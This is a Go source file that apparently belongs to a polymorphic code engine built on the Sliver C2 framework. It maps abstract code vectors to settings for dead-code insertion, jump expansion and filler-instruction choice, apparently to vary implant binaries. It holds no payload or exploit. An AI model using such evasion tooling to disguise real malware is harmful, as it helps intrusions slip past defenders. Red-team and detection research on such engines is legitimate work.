package wig

/*
 * Vector-to-Config Converter
 *
 * Translates code vectors (points in 100D space) into concrete
 * Morpher configurations that guide actual code generation.
 *
 * Novel approach: Vector dimensions map to specific generation parameters,
 * creating a bridge between abstract vector space exploration and
 * concrete code generation.
 *
 * Key innovation: Vector space reasoning → executable configuration
 */

import (
	"github.com/bishopfox/sliver/server/generate/morpher"
)

// VectorToMorphConfig converts a code vector to complete Morpher configuration
// Novel: Abstract vector → concrete generation parameters
func VectorToMorphConfig(vector *CodeVector, manifold *ExecutableManifold) *morpher.MorphConfig {
	config := morpher.DefaultMorphConfig()

	// Set mode from manifold
	config.Mode64 = manifold.Mode64

	// Convert dead code preferences
	config.DeadCodeConfig = VectorToDeadCodeConfig(vector)

	// Convert expansion preferences
	config.ExpansionPolicy = VectorToExpansionPolicy(vector)

	// Enable features based on vector
	config.EnableExpansion = vector.Values[DimJCCFrequency] > 0.1 // Use expanded jumps
	config.EnableDeadCode = true                                  // Always enabled (controlled by rate)

	// Size preferences
	config.PreserveLength = false // Allow alien patterns to expand

	return config
}

// VectorToDeadCodeConfig converts vector to dead code configuration
// Novel: Vector dimensions directly control dead code generation
func VectorToDeadCodeConfig(vector *CodeVector) *morpher.DeadCodeConfig {
	config := morpher.DefaultDeadCodeConfig()

	// Insertion rate from vector
	// Use average of structural density dimensions
	densityAvg := (vector.Values[DimControlFlowDensity] +
		vector.Values[DimStackOpDensity] +
		vector.Values[DimArithmeticDensity]) / 3.0

	config.InsertionRate = densityAvg

	// Complexity from vector
	complexityScore := vector.Values[DimOverallComplexity]
	if complexityScore < 0.33 {
		config.MaxComplexity = 1 // Simple
	} else if complexityScore < 0.67 {
		config.MaxComplexity = 2 // Medium
	} else {
		config.MaxComplexity = 3 // Complex
	}

	config.AllowComplex = complexityScore > 0.8

	// Length preferences from vector
	avgLength := vector.Values[DimAvgLength]
	if avgLength < 0.33 {
		config.MinLength = 1
		config.MaxLength = 2
	} else if avgLength < 0.67 {
		config.MinLength = 1
		config.MaxLength = 3
	} else {
		config.MinLength = 2
		config.MaxLength = 4
	}

	config.VariableLength = true // Always use variety

	return config
}

// VectorToExpansionPolicy converts vector to expansion policy
// Novel: Vector controls expansion aggressiveness
func VectorToExpansionPolicy(vector *CodeVector) *morpher.ExpansionPolicy {
	policy := morpher.DefaultExpansionPolicy()

	// Expansion rate from jump frequency preference
	// High jump frequency → high expansion rate
	policy.Rate = vector.Values[DimJCCFrequency]

	// If rate is very low, ensure minimum expansion
	if policy.Rate < 0.2 {
		policy.Rate = 0.2 // At least 20%
	}

	// Always expand control flow for better polymorphism
	policy.ExpandAllControlFlow = true

	// Avoid long jumps if control flow density is high
	policy.AvoidLongJumps = vector.Values[DimControlFlowDensity] > 0.5

	return policy
}

// VectorToTemplateWeights converts vector to template selection weights
// Novel: Vector guides which templates are preferred
func VectorToTemplateWeights(vector *CodeVector) map[string]float64 {
	weights := make(map[string]float64)

	// Map vector dimensions to template categories
	weights["NOP"] = vector.Values[DimNOPFrequency]
	weights["MOV"] = vector.Values[DimMOVFrequency]
	weights["STACK"] = (vector.Values[DimPUSHFrequency] + vector.Values[DimPOPFrequency]) / 2.0
	weights["TEST"] = vector.Values[DimTESTFrequency]
	weights["CMP"] = vector.Values[DimCMPFrequency]
	weights["LEA"] = vector.Values[DimLEAFrequency]

	// Normalize weights to sum to 1.0
	total := 0.0
	for _, weight := range weights {
		total += weight
	}

	if total > 0 {
		for category := range weights {
			weights[category] /= total
		}
	}

	return weights
}

// EstimateOutputSize predicts morphed code size from vector
// Novel: Planning helper - predict before generating
func EstimateOutputSize(inputSize int, vector *CodeVector) int {
	// Base size
	estimated := float64(inputSize)

	// Factor in expansion
	expansionRate := vector.Values[DimJCCFrequency]
	if expansionRate > 0 {
		// Conditional jumps expand 2→6 bytes (3x)
		// Estimate ~20% of code is conditional jumps
		expansionGrowth := float64(inputSize) * 0.2 * expansionRate * 3
		estimated += expansionGrowth
	}

	// Factor in dead code
	densityAvg := (vector.Values[DimControlFlowDensity] +
		vector.Values[DimStackOpDensity] +
		vector.Values[DimArithmeticDensity]) / 3.0

	avgDeadCodeLength := (vector.Values[DimAvgLength] * 5.0) + 1.0 // 1-6 bytes
	instructionCount := inputSize / 3                              // Rough estimate
	deadCodeGrowth := float64(instructionCount) * densityAvg * avgDeadCodeLength
	estimated += deadCodeGrowth

	return int(estimated)
}

// CreateVectorGuidedMorpher creates a Morpher configured by vector
// Novel: End-to-end vector → configured morpher
func CreateVectorGuidedMorpher(vector *CodeVector, manifold *ExecutableManifold, seed uint32) *morpher.Morpher {
	// Convert vector to config
	config := VectorToMorphConfig(vector, manifold)

	// Override seed if provided
	if seed != 0 {
		config.Seed = seed
	}

	// Create morpher
	return morpher.NewMorpher(config)
}
